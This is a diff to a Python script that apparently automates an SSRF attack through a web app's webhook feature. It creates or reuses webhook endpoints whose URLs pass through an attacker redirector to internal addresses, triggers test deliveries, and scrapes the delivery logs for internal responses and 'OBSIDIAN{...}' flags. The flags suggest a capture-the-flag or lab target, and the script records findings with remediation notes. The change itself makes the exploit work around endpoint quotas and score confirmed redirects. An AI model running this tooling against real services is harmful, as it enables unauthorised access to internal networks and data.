@@ -52,6 +52,8 @@ def main():
     p.add_argument("--inner", action="append", default=[],
                    help="内网/内部 URL，可重复；如 http://api:8000/metrics")
     p.add_argument("--events", default="order.created")
+    p.add_argument("--endpoint-id", type=int, default=None,
+                   help="复用已存在的回调端点（配额满时用）")
     p.add_argument("--wait", type=float, default=3)
     p.add_argument("--rps", type=float, default=1.0)
     p.add_argument("--timeout", type=float, default=45)
@@ -77,31 +79,44 @@ def main():
 
     for inner in args.inner:
         url = args.redirector + urllib.parse.quote(inner, safe="")
-        r = c.post(args.page, data={"_csrf": csrf, "url": url, "events": args.events},
-                   headers={"Referer": args.base + args.page}, tag="webhook-create")
-        after = c.get(args.page, tag="webhook-after-create")
-        ids = [int(i) for i in re.findall(r"/webhooks/(\d+)/test", after["text"])]
-        rid = max(ids) if ids else None
-        print("create", inner, "->", r["status"], "id", rid)
-        if not rid:
-            print("  create rejected (max endpoints?)")
-            continue
-        csrf2 = csrf_of(after["text"])
+        if args.endpoint_id:
+            rid = args.endpoint_id
+            print("reuse endpoint", rid, "->", inner)
+        else:
+            r = c.post(args.page, data={"_csrf": csrf, "url": url, "events": args.events},
+                       headers={"Referer": args.base + args.page}, tag="webhook-create")
+            after = c.get(args.page, tag="webhook-after-create")
+            ids = [int(i) for i in re.findall(r"/webhooks/(\d+)/test", after["text"])]
+            rid = max(ids) if ids else None
+            print("create", inner, "->", r["status"], "id", rid)
+            if not rid:
+                print("  create rejected (max endpoints?); retry with --endpoint-id N")
+                continue
+        page2 = c.get(args.page, tag="webhook-before-test")
+        csrf2 = csrf_of(page2["text"])
+        if not csrf2:
+            print("  no csrf before test"); continue
         c.post("%s/%d/test" % (args.page, rid), data={"_csrf": csrf2},
                headers={"Referer": args.base + args.page}, tag="webhook-test-%d" % rid)
         time.sleep(args.wait)
         final = c.get(args.page, tag="webhook-after-test")
         rows = delivery_rows(final["text"])
         hit = [x for x in rows if inner in x or args.redirector in x]
-        print("  delivery:", hit[-1][:800] if hit else "(no row)")
+        delivery = hit[-1][:800] if hit else ""
         flags = re.findall(r"OBSIDIAN\{[^}]+\}", html.unescape(final["text"]))
-        store.add(module="webhook", title="Webhook 重定向 SSRF 测试", severity="info",
-                  endpoint=args.base + args.page, method="POST", confidence="needs-review",
-                  evidence={"redirector": args.redirector, "inner": inner, "report_id": rid,
-                            "delivery": hit[-1][:800] if hit else "",
-                            "flags": flags},
-                  impact="若首跳合法、投递跳到内网并返回 200/内部数据，则 SSRF 成立。",
-                  remediation="每一跳都做 URL/私网校验；出站白名单。",
+        codes = re.findall(r"\b[1-5]\d{2}\b", delivery)
+        followed = bool(re.search(r"\b30[1278]\b.{0,60}?\b20[0-4]\b", delivery, re.S))
+        severity = "high" if (flags or followed) else "info"
+        confidence = "confirmed" if flags else ("confirmed-redirect" if followed else "needs-review")
+        print("  delivery:", delivery or "(no row)", "| codes", codes)
+        store.add(module="webhook", title="Webhook 重定向 SSRF 测试", severity=severity,
+                  endpoint=args.base + args.page, method="POST", confidence=confidence,
+                  evidence={"redirector": args.redirector, "inner": inner, "endpoint_id": rid,
+                            "delivery": delivery, "codes": codes, "flags": flags},
+                  impact=("首跳 HTTPS 合法、投递跟随 302 进入内网并返回内容，SSRF 成立。"
+                          if (flags or followed) else
+                          "未见跟随跳转或内网响应；换 redirector/内部端口再试。"),
+                  remediation="每一跳都做 URL/私网校验；出站白名单；禁止跟随到私网地址。",
                   tags=["ssrf", "webhook"])
     store.save()
     print(json.dumps(store.summary(), ensure_ascii=False))
